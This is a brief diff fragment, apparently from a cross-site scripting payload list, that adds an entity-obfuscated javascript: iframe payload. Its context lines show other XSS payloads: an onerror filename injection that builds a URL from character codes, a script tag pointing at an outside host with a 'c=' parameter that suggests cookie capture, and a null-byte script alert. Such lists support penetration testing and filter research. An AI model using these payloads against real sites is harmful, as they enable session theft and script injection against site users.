@@ -21,3 +21,5 @@ change the filename to \"><img src=1 onerror=\"url=String104,116,116,112,115,58,
 
 <script src=//mysite.com?c=
 %00<script>alert(1)</script>
+
+<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
